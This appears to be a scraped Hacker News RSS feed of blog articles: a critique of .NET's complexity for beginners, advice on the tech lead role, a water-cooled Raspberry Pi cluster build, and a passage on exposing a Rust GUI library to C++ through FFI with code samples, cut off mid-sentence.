<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last night I came across this question on Reddit:</p>
<blockquote>
    <header><h5><a href="https://www.reddit.com/r/csharp/comments/hkmnue/i_am_just_starting_to_learn_c_and_i_am_confused/">I am just starting to learn C# and i am confused about .NET framework &amp; .NET Core</a></h5></header>
    <p>Hello, I am just starting to learn c# and i am about to start with a course on Udemy by Mosh Hamedani called "C# Basics for Beginners: Learn C# Fundamentals by Coding".
       I can see that he is using .NET Framework but i have read that .NET Core is newer and is the future? I am really not sure where to start and would appreciate if anyone could help me. I would like to learn C# to have a better understanding with OOP and to learn a programming language to help with my University course. Thank you</p>
</blockquote>
<p>First of all congratulations to the author for learning C# which is a great choice of programming language and for putting in the extra effort into better understanding the concepts of OOP (object oriented programming)! I genuinely hope that they'll have a great experience learning .NET and most importantly that they'll enjoy picking up some new skills and have fun along the way! I remember when I started to code (more than 20 years ago) and how much fun it was for me! It is also great to see how many people have replied with really helpful answers and provided some useful guidance to the original thread! It is a true testament to how supportive and welcoming the .NET community is! However, despite these positive observations I'm still a little bit gutted that such a question had to be even asked in the first place. I don't imply any fault on the author themselves - quite contrary - I actually really sympathise with them and can understand the sort of struggles which a new C# or F# developer may face. Questions like these really demonstrate how complex .NET has become over the years. It is a good time to take a step back and reflect!</p>
<h2 id="high-cognitive-entry-barrier">High cognitive entry barrier</h2>
<p>.NET has a high cognitive entry barrier. What I mean by this is that a new developer has to quickly familiarise themselves with rather boring and complex topics way too early in their educational journey. In particular questions around the differences between .NET, .NET Core, Mono, Xamarin, and the relation between C#, F#, VB.NET and what a target framework or a runtime is add very little to almost no benefit to one's initial learning experience. Most newcomers just want to read a tutorial, watch a video or attend a class and then be able to apply their newly learned skills in an easy and uncomplicated way. Ideally educational material such as purchased online courses or books from more than a few months ago should still be relevant today. Unfortunately neither of these are true for .NET. As a matter of fact it's almost given that any content which has been written more than a year ago is largely outdated today. Just think about the <a href="https://devblogs.microsoft.com/dotnet/introducing-net-5/">upcoming release of .NET 5</a> and how it will invalidate most of the lessons taught just a few months ago. Another prominent example is the very short lived <a href="https://docs.microsoft.com/en-us/dotnet/standard/net-standard">.NET Standard</a>. Once hugely evangelised and now de-facto dead. I personally think Microsoft, the .NET team and to some extent the wider .NET community has failed in making .NET a more beginner friendly language. I say this from a good place in my heart. Programming is an extremely powerful skill which can allow people to uplift themselves from all sorts of backgrounds and the harder we make it for beginners, the more exclusive we make the entry to our profession. I think the success of the next ten years will be defined by how accessible we make .NET to a whole new population of developers and I think there's some real work to be done in order to improve the current situation!</p>
<h2 id="what-about-others">What about others?</h2>
<p>Before you think that the current complexity is normal in programming and nothing endemic to .NET itself then I'm afraid to prove you wrong. <a href="https://www.php.net/">Take a look at PHP</a>. PHP has evolved a lot over the years and while it has introduced more complicated object oriented concepts and improved on its performance, it hasn't lost the beauty of its original simplicity at all. PHP is a great programming language to learn. Beginner content exist like sand on a beach. The online community, forums, Reddits and conferences are second to none. Most importantly, a student could pass on a several years old PHP book to another person and they would still get a lot of value from it. The language might have moved on, but many things which were taught on a beginner level are still 100% accurate today. This is a huge advantage which gets easily forgotten by more advanced developers like myself. Furthermore the distinction between language and the interpreter is not something which a new PHP developer has to understand. A new beginner doesn't have to wrap their head around such relatively unimportant topics to get started. They just know that they've installed PHP and it works.</p>
<p>Another great example (and there are many great examples) is <a href="https://golang.org/">Go</a>. Go is not a new language at all. It's <a href="https://opensource.googleblog.com/2009/11/hey-ho-lets-go.html">been around for more than 10 years</a> and despite huge improvements to the language, the compiler and the standard library it has remained faithful to its original simple design. Similar to PHP a new developer doesn't have to think about complicated nuances between "target frameworks", weird gotchas if they write Go in one IDE or another and they certainly don't have to look up a complicated version matrix to understand the intricate relations between an SDK, the runtime and newly available language features. There is just one version which maps to a well defined list of features, bug fixes and improvements in Go. It's documentation is simple and easy to comprehend. It is a very beginner friendly language.</p>
<h2 id="improving-net">Improving .NET</h2>
<p>Why is .NET so complicated? Well, the answer is perhaps not that easy itself. It's mostly history, legacy baggage, some bad decisions in the past and what I believe an overly eager desire (almost urgency) to change things for changes' sake. I will try to name a few selected issues from my personal observation, describe the problems which I have perceived and try to provide some constructive suggestions which I think could be a good improvement for the future.</p>
<p>Let me introduce you to the <strong>6 Sins of .NET</strong>:</p>
<ul>
<li><a href="#language-spaghetti">Language Spaghetti</a></li>
<li><a href="#version-overflow">Version Overflow</a></li>
<li><a href="#net-everywhere">.NET Everywhere</a></li>
<li><a href="#all-eyez-on-me">All Eyez on Me</a></li>
<li><a href="#architecture-break-down">Architecture Break Down</a></li>
<li><a href="#name-overload">Name Overload</a></li>
</ul>
<h3 id="language-spaghetti">Language Spaghetti</h3>
<p>If a person sets out to learn C# (like the author from the question above), what do they learn? Is it C# or .NET? The answer is both. C# doesn't exist without .NET and you cannot program .NET without C# (or F# or VB.NET for that matter). This is not a problem in itself, but certainly where some of the issues begin. A new beginner doesn't just learn C# but also has to learn the inner workings of .NET. Things get even more confusing when C# isn't the initial .NET language to learn. Supposedly the loose relationship between .NET languages shouldn't really matter because they compile into IL and become cross compatible. <a href="https://github.com/dotnet/vblang/issues/300">Except when they don't</a>:</p>
<p><a href="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/csharp-unmanaged-constraint-leak.png"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/csharp-unmanaged-constraint-leak.png" alt="C# unmanaged constraint language leak"></a></p>
<p>The <a href="https://docs.microsoft.com/en-us/dotnet/standard/framework-libraries#base-class-libraries">BCL (Base Class Libraries)</a> provide the foundation for all three languages, yet they are only written in C#. That's not really an issue unless entire features were written with only one language in mind and are extremely cumbersome to use from another. For example, F# still doesn't have <a href="https://github.com/fsharp/fslang-suggestions/issues/581">native support for <code>Task</code> and <code>Task&lt;T&gt;</code></a>, converting between <code>System.Collection.*</code> classes and F# types is a painful undertaking and F# functions and .NET <code>Action&lt;T&gt;</code> objects don't map very well.</p>
<p>The most frustrating thing though is when <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">changes to one language</a> force <a href="https://github.com/fsharp/fslang-suggestions/issues/577">additional complexity on another</a>.</p>
<p>Interop issues between those three languages are a big burden on new developers, particularly when they start with something else but C#. However, as painful as this might be, interop problems are not the only complexity which a new beginner has to face. Try to explain to a new C# user in a meaningful way when they should use <a href="https://docs.microsoft.com/en-us/dotnet/csharp/tutorials/inheritance">inheritance with standard classes</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/interfaces/">interfaces</a>, <a href="https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/classes-and-structs/abstract-and-sealed-classes-and-class-members">abstract classes</a> or <a href="https://docs.microsoft.com/en-us/dotnet/csharp/tutorials/default-interface-methods-versions">interfaces with default method implementations</a>. The differences between those options have been so watered down that one cannot explain the distinctions in a single coherent answer anymore.</p>
<p>Take this <a href="https://stackoverflow.com/questions/2570814/when-to-use-abstract-classes">StackOverflow question</a> for an example. Nothing which has been described in the accepted (and most upvoted) answer below isn't also true for interfaces with default method implementations today:</p>
<p><a href="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/abstract-class-question-stack-overflow.png"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/abstract-class-question-stack-overflow.png" alt="Abstract class question on StackOverflow"></a></p>
<p>Another great example is the growing variety of C# data types. When is it appropriate to create a <a href="https://docs.microsoft.com/en-us/aspnet/web-api/overview/data/using-web-api-with-entity-framework/part-5">data class</a>, an <a href="https://www.c-sharpcorner.com/article/all-about-c-sharp-immutable-classes2/">immutable data class</a>, a <a href="http://mustoverride.com/tuples_structs/">mutable struct</a>, an <a href="https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/builtin-types/struct#readonly-struct">immutable struct</a>, a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.tuple?view=netcore-3.1">tuple class</a>, the new concept of <a href="https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/builtin-types/value-tuples">named tuples</a> or the upcoming <a href="https://www.stevefenton.co.uk/2020/05/csharp-9-record-types/">record type</a>?</p>
<p>Seasoned .NET developers are very opinionated about when to use each of these types and depending on who a new beginner will ask, or which StackOverflow thread they'll read, they will most likely get very different and often contradicting advice. Anyone who doesn't think that this is a massive problem must be in serious denial. Learning a programming language is hard enough on its own. Learning a programming language where two mentors (who you might look up to) give you contradicting advice is even harder.</p>
<p>The irony is that many of the newly added language and framework features are supposed to make .NET easier to learn:</p>
<p><a href="https://twitter.com/shanselman/status/1281856685657616384"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/tweet-dotnet-easier.png" alt="Make .NET easier"></a></p>
<p><em>(BTW, I have been a huge proponent of dropping the <code>.csproj</code> and <code>.sln</code> files for a very long time but previously Microsoft employees defended them as if someone offended their family, so it's nice to finally see some support for that idea too! :))</em></p>
<p>Don't get me wrong, I agree with Scott that *this particular feature* will make writing a first hello world app a lot easier than before, however, our friend Joseph Woodward makes a good point that nothing comes for free:</p>
<p><a href="https://twitter.com/joe_mighty/status/1281899362281566208"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/tweet-dotnet-reboot-3.png" alt="With great power comes great responsibility"></a></p>
<p>And he's not alone with this idea:</p>
<p><a href="https://twitter.com/buhakmeh/status/1281985930279223298"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/tweet-dotnet-hard-2.png" alt=".NET is hard"></a></p>
<p><a href="https://twitter.com/FransBouma/status/1282059062247555082"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/tweet-dotnet-hard-3.png" alt=".NET is hard"></a></p>
<p>It's not just about learning how to write C#. A huge part of learning .NET is reading other people's code, which is also getting inherently more difficult as a result:</p>
<p><a href="https://twitter.com/1amjau/status/1281908190167347200"><img src="https://storage.googleapis.com/dusted-codes/images/blog-posts/2020-07-05/tweet-dotnet-hard-4.png" alt=".NET is hard"></a></p>
<p>Whilst I do like and support the idea of adding more features to C#, I cannot ignore the fact that it also takes its toll.</p>
<p>Some people raised a good ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dusted.codes/dotnet-for-beginners">https://dusted.codes/dotnet-for-beginners</a></em></p>]]>
            </description>
            <link>https://dusted.codes/dotnet-for-beginners</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802480</guid>
            <pubDate>Sat, 16 Jan 2021 14:45:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Being an Effective Tech Lead]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802396">thread link</a>) | @DDerTyp
<br/>
January 16, 2021 | https://mikeborozdin.com/post/being-effective-tech-lead/ | <a href="https://web.archive.org/web/*/https://mikeborozdin.com/post/being-effective-tech-lead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>Tech Lead / Lead Developer / (Whatever it is called in your company) is a very interesting role that combines technical
work and leadership.</p>

<p>I‚Äôve been in that role at a few different companies and I‚Äôd like to share my thoughts on what you can do to be effective in that role.</p>

<p>Equally, this article may also help you to decide if you want to try the role.
<!-- more --></p>



<p>Your first and foremost goal as a tech lead is to enable your team. Your team‚Äôs success is your success. </p>

<p>Yes, it was partly your technical chops that brought you into this role, but a tech lead is not the person who writes the best
code on the team (at least not just). </p>

<p>But it is the person who enables the entire team. And that means doing whatever it takes to help your team to 
succeed - whether it‚Äôs mentoring them technically or buying coffee - you have to do it.</p>

<p>Generally though you work on two fronts - product and technical.</p>

<h2 id="product">Product</h2>

<p>Yes, it is a role of a product manager to define a product vision, build a roadmap, and write user stories. But if user stories are missing details or the team does not know what they‚Äôll be coding next week, it is your responsibility to step and help the team.
Sometimes it means you‚Äôll fill the gaps yourself and tell the team about what you‚Äôve heard in that long product meeting last Thursday.</p>

<p>Or sometimes you have to guide the product team on how to better translate their ideas into something developers can work with. </p>

<p>Shortly, you need to make sure that your team knows not only <strong>how</strong> to build software, but <strong>what</strong> to build.</p>

<h2 id="technical">Technical</h2>

<p>And speaking of the question of how to build, this is where your technical expertise comes in. </p>

<p>You need to make sure that your team knows how to build those fancy features and fix pesky bugs.</p>

<p>So if someone has not worked on a certain part of the codebase, sit with them and walk them through it.</p>

<p>If someone does not know which environment to deploy and where the API keys are, help them with that. </p>

<p>If someone is stuck, drop whatever you‚Äôre doing and unblock them. </p>

<h2 id="but-delegate-and-help-your-teammates-grow">But‚Ä¶ delegate and help your teammates grow</h2>

<p>Although you‚Äôre there to protect your team and help them focus on writing code, you shouldn‚Äôt take away all non-coding activities from them. </p>

<p>You don‚Äôt have to be the only person who onboards new team members, defines architecture, and fleshes out user stories with product managers. </p>

<p>If you do that, you‚Äôll soon end up being a bottleneck for your team. Moreover, you‚Äôll prevent your team members from growing professionally.</p>

<p>Instead, identify activities which your teammates are interested in and let them run with that.</p>

<p>If you happen to be their line manager, it‚Äôs double as important to do that, as it‚Äôll help them with their career growth. And if you‚Äôre not line managing your team, you may pair up with their manager and find out what career aspirations your colleagues have and give them a chance to go in that direction.</p>



<p>It‚Äôs your job as a tech lead to communicate and provide clarity. The product team may need to know how long some features will take - and you will have to tell a Product Manager that feature XYZ will take longer because the team needs to do essential refactoring.</p>

<p>Equally, your team needs to know that there might be a change in a product direction in two months, hence it is worthwhile to invest time in bringing framework ABC.</p>



<p>I have already mentioned working closely with product managers a few times. Here I want to stress why it is important and a few usual things you have to do.</p>

<p>First of all, you‚Äôre the main point of contact for all things technical to the product and other departments (if you are working on B2B software you may also have to interact with sales and professional services). So do expect a lot of questions from them about timelines and feasibility of their ambitious ideas.</p>

<p>But working with the product team is more than just answering their questions, it is also about being proactive. It is up to you to help them to build a roadmap. It is up to you to say that certain features are not possible without doing an essential technical work. It is up to you to say that all feature work should stop and you have to move to a different framework.</p>

<p>Equally, it is for you to say that some features are less complex than they thought before and that you can do them now.</p>

<h2 id="but-then-again-help-your-fellow-engineers-engage-with-product">But‚Ä¶ then again help your fellow engineers engage with product</h2>

<p>Yes, you should protect engineers‚Äô time, so don‚Äôt invite them to all the meetings. </p>

<p>But every software engineer is still interested to know which features they‚Äôll be coding in six months‚Äô time. Every software engineer has great ideas on how to improve the product.</p>

<p>So make that happen - make sure that the product team talks to engineers about product plans and that they all sit together to flesh out user stories.</p>



<p>A tech lead should trust their team to make the best decisions. If someone wants to introduce a 3rd party library XYZ for doing ABC, then let them do it. If your colleague proposes re-designing a part of the system, let them do it, too.</p>

<h2 id="but-be-prepared-to-ask-question-in-a-helpful-way">But‚Ä¶ be prepared to ask question in a helpful way</h2>

<p>Whether it‚Äôs choosing a 3rd party library or deciding on architecture, make sure your colleagues have considered alternatives and impact on maintainability, project timelines, performance, security, etc. Feel free to ask questions about that.</p>

<p>Equally be prepared to step in and guide your fellow developers. For instance, if you notice that some tasks are taking much longer than expected, do speak to engineers who are working on them. They may be busy trying to consider every possible edge case that may never happen or do refactoring that should be a separate task. Help your team to avoid such rabbit holes.</p>



<p>As a technical lead you should look ahead and be strategic. More specifically, you should:</p>

<ul>
  <li>Collaboratively establish architecture and coding standards</li>
  <li>Prioritise working on technical debt</li>
  <li>Look into newer version of the tools you use and make sure that you keep your codebase up to date</li>
  <li>See what other technologies are available and how they can help your team</li>
</ul>

<p>And that is impossible without you staying on the bleeding edge of technology. Remember, technical lead does have ‚ÄòTechnical‚Äô in it. </p>

<p>Yes, it‚Äôs a people intensive role, but it is also about technology. And on that note‚Ä¶</p>



<p>A technical lead is expected to code. But how much can vary significantly week by week. Sometimes, you‚Äôll have the luxury of spending 80% of your time coding away new features. Sometimes, it‚Äôll be only 20% of your time.</p>

<p>What is important is to set expectations with your colleagues. No-one would mind if you say that next week you‚Äôll be able to only commit 30% of your time to writing code. But they will certainly be less happy if you forget to mention that. And that includes both other engineers, who may wait for you to redesign an API endpoint, or product managers who expect you to finish that feature that all users want to see.</p>



<p>Often as a tech lead you don‚Äôt have line management responsibilities, but it is often you who knows your teammates the best and it is you who can help them to get a promotion, salary increase, bonus, more equity, etc. </p>

<p>So do spend some time with their line manager and pass on feedback. Plus, their line manager can also tell you where you can help your colleagues in their career. You may even want to establish a pattern that you speak to their line manager and pass feedback on before their 1:2:1‚Äôs.</p>



<p>Tech lead is a great role. It allows you to write code and gain exposure to leadership, people, and product. But remember it‚Äôs not about you, but about helping you team to succeed!</p>

  </article></div>]]>
            </description>
            <link>https://mikeborozdin.com/post/being-effective-tech-lead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802396</guid>
            <pubDate>Sat, 16 Jan 2021 14:34:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Most Beautiful Water-Cooled Raspberry Pi 4 Cluster in History]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802341">thread link</a>) | @alexellisuk
<br/>
January 16, 2021 | https://www.hackster.io/news/the-most-beautiful-water-cooled-raspberry-pi-4-cluster-in-history-09ed3715dad8 | <a href="https://web.archive.org/web/*/https://www.hackster.io/news/the-most-beautiful-water-cooled-raspberry-pi-4-cluster-in-history-09ed3715dad8">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><p><span>Most computers are air-cooled, either passively or actively with a fan. But water-cooling is occasionally used, particularly when overclocking. Like when Porsche transitioned from air-cooled to water-cooled engines in the 911 line of sports cars, this allows for increased performance by better dissipating waste heat. Even the best machines in the world‚Äîcomputers included ‚Äî are slightly inefficient, and the byproduct of that inefficiency is often heat. Parts start breaking when they get too hot, so it is necessary to pull that heat away if you want to push the limits of performance. Michael Klements </span><a href="https://www.the-diy-life.com/building-a-water-cooled-raspberry-pi-4-cluster/" rel="nofollow">built this Raspberry Pi 4 cluster</a><span> and it may just have the most beautiful water cooling setup in history.</span></p><figure></figure><p>Every single-board computer in the Raspberry Pi lineup is built to be passively air-cooled. Those computers are equipped with ARM processors that are designed for mobile devices that don‚Äôt usually have room for fans. Arm processors are particularly efficient and run on very little power, so the waste heat is minimal. But if you‚Äôre constantly maxing out your Raspberry Pi‚Äôs processor or if you‚Äôre overclocking, then you will want active cooling. A heatsink on the processor combined with a small fan is usually sufficient, but water cooling is even better. It is superior because heat transfers quickly from the heatsink to the water, which is then pumped away to a massive heatsink and fan. That‚Äôs probably overkill for a single Raspberry Pi, but it is great for a cluster like this one.</p><p>This cluster contains eight Raspberry Pi 4 Model B (2GB) computers that can work together to process distributed loads. They‚Äôre all cooled by an off-the-shelf water cooler system that was modified for this build. That has eight heat blocks that are attached to their respective Pis in series with laser-cut translucent red acrylic mounts. Cooling in series does mean that the last Pi in the chain will get the warmest water, but it should still be effective in this case. Power comes from a beefy power supply via USB. To ensure network throughput and reliability, the Pis are connected via Ethernet to a switch. A 7‚Äù touchscreen LCD is connected to the master Raspberry Pi node to display data about the current job and each Pi‚Äôs status. All of those components are mounted onto a large wood frame that was painted black. A strip of LEDs behind the frame creates a nice glow effect. Klements doesn‚Äôt go into the software side of this project, but the hardware alone is stunning to look at.</p></div></section></div>]]>
            </description>
            <link>https://www.hackster.io/news/the-most-beautiful-water-cooled-raspberry-pi-4-cluster-in-history-09ed3715dad8</link>
            <guid isPermaLink="false">hacker-news-small-sites-25802341</guid>
            <pubDate>Sat, 16 Jan 2021 14:29:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expose a Rust Library to Other Languages]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25802319">thread link</a>) | @lukastyrychtr
<br/>
January 16, 2021 | https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on January 13, 2021 by Olivier Goffart and Simon Hausmann</h5>
    
  <p>
    With <a href="https://sixtyfps.io/">SixtyFPS</a>, we are creating a GUI toolkit. We chose
    Rust as the implementation language for our runtime library, and we want to make the same library usable from different
    programming languages. We believe programmers in all languages need to build GUIs - powered by the same runtime library.
    Rust, with its Foreign Function Interface (FFI) is an excellent choice.<br> In
    this article we look at how to expose an idiomatic C++ API from our Rust library.
  </p>

<h3 id="the-challenge">The Challenge</h3>

    <p>Initially we chose to start with support for three languages:</p>
    <ul>
        <li><b>Rust</b>: Because it's our implementation language.</li>
        <li><b>C++</b>: It's a low level language that we're familiar with, and is still one of the most established languages
            in the embedded device space.</li>
        <li><b>JavaScript / TypeScript</b>: Because it's a very popular dynamic language.</li>
    </ul>


    <p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/diagrams.png"></p><p>The Rust library (also known as a crate) is split into two parts, the shared implementation crate and a thin idiomatic
        API crate.
    </p>
    <p>For JavaScript we use <a href="https://github.com/neon-bindings/neon">Neon</a> to expose an API. Neon enables us
        to conveniently write JavaScript APIs and create an NPM package.</p>
    <p>The C++ part is a bit more challenging.</p>

<h3 id="expose-idiomatic-cpp-api-through-ffi">Expose an Idiomatic C++ API through Rust FFI</h3>

    <p>We decided to keep the C++ API only in the header files. This is because, unlike with Rust, there's
        no widely adopted C++ equivalent of Cargo, to help with downloading and building dependencies. If we want to ship
        binaries, then we have to maintain ABI compatibility, which is difficult in C++.<br> This way, we can also keep the
        C++ binding as lightweight as possible: for performance and memory footprint.
    </p>
    
    <p>Rust cannot expose a C++ API: structures can only be exported using a C representation (<code>#[repr(C)]</code>) and
        <code>extern "C"</code> functions. This means that we cannot expose Rust features like traits, generics, or
        destructors even if they have a C++ equivalent.
     </p>
     
    <p>The Rust ecosystem provides a few helper crates to make the job easier:</p>
     <ul>
        <li><a href="https://github.com/eqrion/cbindgen"><b>cbindgen</b></a>: This helper crate automatically generates C/C++
            header files based on the <code>repr(C)</code> structure and the <code>extern "C"</code> functions. We use
            cbindgen to generate internal header files only. It's very helpful to avoid manually writing some unsafe error-prone
            boilerplate. 
        </li>
        <li><a href="https://github.com/mystor/rust-cpp">The <b>cpp</b> crate</a>: This
            helper crate is useful when calling C++ libraries from Rust, and we make use of that. However it is not suitable for
            exposing a C++ API from Rust. (Note: Olivier Goffart happens to be the maintainer.)
        </li>
                
        <li><a href="https://cxx.rs/">The <b>cxx</b> crate</a>: This would be a safer way than cbindgen to ensure that the
            interface between C++ and Rust is correct. While it could be useful, cbindgen already get us a long way. So
            we don't use it for now.
        </li>
    </ul>

<p>To build the correct shared library we use Cargo. The resulting library exports C mangled symbols. We ship
    a set of C++ header files that provide the C++ API and use the C functions behind the scenes. For convenience,
    we provide a CMake integration that ties together the library linkage and includes path setup. </p>

<h3 id="slices-vectors-strings">Slices, Vectors, and Strings</h3>

    <p>
    In FFI, passing a basic integer works out of the box. But what about more complex data types, like a 
    Rust slice or a string? Well, most classes like Rust's String, Vec, or slices are not <code>#[repr(C)]</code>,
    so we can't use them directly. While we could use these classes with an indirection, every simple call may need to go
    through a non-inline function boundary. So we would need to convert types, which means re-allocating memory.</p>
    <p>So instead of sharing code, we implemented data structures using <code>#[repr(C)]</code> and a stable ABI, so
        that they can be accessed directly from C++ and Rust, or any low-level language.</p>

   <p>For the slice we create a structure that holds a pointer and a size:</p>

<pre><code>#[repr(C)]
pub struct Slice&lt;'a, T&gt; {
    ptr: NonNull&lt;T&gt;,
    len: usize,
    phantom: PhantomData&lt;&amp;'a [T]&gt;,
}
</code></pre>

<p><code>Slice&lt;'a, T&gt;</code> can be dereferenced to <code>&amp;'a [T]</code>.
    In C++, cbindgen generates the following snippet:


</p><pre><code>template&lt;typename T&gt;
struct Slice {
    T *ptr;
    uintptr_t len;
};
</code></pre>

<p>We tell cbindgen to generate that code in a <code>cbindgen_private</code> namespace, and we wrap it an interface
similar to <code>std::span</code>.</p>

<p>We use strings and vectors to pass data between the engine and the user's code. This results in
    shared ownership where we want to avoid unnecessary copying of data. Our API is property based
    with setters and getters, therefore we implement shared ownership through
    <a href="https://en.wikipedia.org/wiki/Copy-on-write"></a>Implicit sharing / Copy-on-write. </p>

<p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/sharedvector.png"></p><pre><code>#[repr(C)]
struct SharedVectorHeader {
    refcount: atomic::AtomicIsize,
    size: usize,
    capacity: usize,
}

#[repr(C)]
pub struct SharedVector&lt;T&gt; {
    inner: NonNull&lt;SharedVectorInner&lt;T&gt;&gt;,
}


/// These functions are called from the C++ constructor
/// and destructor
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_allocate(
    size: usize, align: usize) -&gt; *mut u8 { /*...*/ }
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_free(
    ptr: *mut u8, size: usize, align: usize) { /*...*/ }
}
</code></pre>

<p>In Rust, the <code>impl Clone</code> and <code>impl Drop</code> make sure to increment
and decrement the atomic reference count and call the destructors. Similarly, in C++, we implement
copy constructor and destructor for the same purpose. Note that we still need to call the Rust
allocator function via the exposed C interface.</p>

<p>Now we can write a wrapper in C++:
(<a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/api/sixtyfps-cpp/include/sixtyfps_sharedvector.h">full file</a>)
</p>

<pre><code>template&lt;typename T&gt; struct SharedVector {
  SharedVector() : inner(nullptr) {}

  SharedVector(const SharedVector &amp;other)
    : inner(other.inner)
  { if (inner) ++inner-&gt;refcount; }

  ~SharedVector() {
     if (inner &amp;&amp; (--inner-&gt;refcount) == 0) {
        for (auto it = begin(); it &lt; end(); ++it)
            it-&gt;~T();
        cbindgen_private::sixtyfps_shared_vector_free(
            reinterpret_cast&lt;uint8_t *&gt;(inner),
            sizeof(SharedVectorHeader)
                + inner-&gt;capacity * sizeof(T),
            alignof(SharedVectorHeader));
     }
  }
  SharedVector &amp;operator=(const SharedVector &amp;other)
  { /*...*/ }

  const T *begin() const { /* ... */ }
  const T *end() const { /* ... */ }
  void push_back(const T &amp;value) { /* ... */ }
  // ... more vector-like API

private:
  // (SharedVectorHeader is generated by cbindgen)
  cbindgen_private::SharedVectorHeader *inner;
};
</code></pre>


    <p>Right now these types, such as <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a>, are within the internal <code>sixtyfps-corelib</code>
        crate, and re-exported for Rust users through the public <code>sixtyfps</code> crate.  If there is demand for it, we may consider moving them into a
        smaller public crate with its own release schedule.</p>


<h3 id="destructors">Destructors</h3>

    <p>It's important to note that <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a> have destructors in C++.
        We can't pass instances by value in <code>extern "C"</code> functions, because the calling conventions are different
        for arguments or return types with C++ destructors; not supported by C. Therefore we can only pass them by pointer
        or reference.
    </p>

    <p>If we want to add a C++ destructor, constructor, or any member functions to types directly exported by cbindgen to our public API, 
        we use 
        <code><a href="https://docs.rs/cbindgen/0.16.0/cbindgen/struct.ExportConfig.html">cbindgen::ExportConfig</a>::body</code>:</p>

<pre><code>cbindgen_config.export.body.insert(
    "MyStruct".to_owned(),
    "    inline MyStruct(); inline ~MyStruct();".to_owned()
  );
</code></pre>

    <p>
    Then we implement <code>MyStruct::MyStruct</code> and <code>MyStruct::~MyStruct</code> in a manually
    written header file, by either doing the memory management directly or calling C helper functions
    implemented in Rust.</p>
     <p>It's important to keep in mind that anything allocated from Rust needs to be freed by Rust. 
    The same applies to allocations in C++: they might not share the same allocator.
    </p>

<h3 id="dynamic-dispatch">Dynamic Dispatch (virtual table) Across the Language Barrier</h3>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Bon_toutou.png/186px-Bon_toutou.png"></p><p>
    Let's start with the classic example of dynamic dispatch in Rust:</p>
<pre><code>pub trait Animal {
  fn speak(&amp;self, loudness: i32) -&gt; String;
}
struct Dog { name: String }
impl Animal for Dog {
  fn speak(&amp;self, loudness: i32) -&gt; String
  { "Waf!".into() }
}
#[no_mangle]
pub extern "C" fn do_something_with(
  animal: &amp;dyn Animal
) {
  println!("{}", animal.speak(1));
}
</code></pre>

<p>Unfortunately the above code does not work. How could we implement a class <code>Cat</code>
in C++ and call the <code>do_something_with</code> function? What if we wanted to implement
<code>do_something_with</code> in C++? The problem is that trait objects (<code>&amp;dyn</code>) are not
valid in FFI - their binary representation is not guaranteed to be stable. If we try to compile the above code,
we get this warning:</p>

<pre><code>warning: `extern` fn uses type `dyn Animal`, which is not FFI-safe
  | extern "C" fn do_something_with(animal: &amp;dyn Animal)
  |                                         ^^^^^^^^^^^ not FFI-safe
  = note: `#[warn(improper_ctypes_definitions)]` on by default
  = note: trait objects have no C equivalent</code></pre>

  <!--https://doc.rust-lang.org/reference/types/trait-object.html-->
<p>Internally, <a href="https://brson.github.io/rust-anthology/1/all-about-trait-objects.html">we know</a> that
a trait object is composed of a pointer to the instance, and a pointer to a virtual table containing
pointers to functions. The layout of this trait object (which pointer comes first) and the layout of the virtual
table is an implementation detail of Rust. So we decided to re-implement them to work accross FFI. Instead of
writing a <code>trait Animal</code>, we write a virtual table by hand:</p>

<pre><code>#[repr(C)]
pub struct AnimalVTable {
    speak: extern "C" fn speak(
        VRef&lt;AnimalVTable&gt;, i32, &amp; mut SharedString);
}
</code></pre>
<p>In this case, our virtual table has only one function. It is <code>#[repr(C)]</code> so that
cbindgen can generate a structure that the C++ code can access. Since we can't use <code>String</code>
we changed the return type to <code>SharedString</code>. We also pass the parameter by mutable reference instead
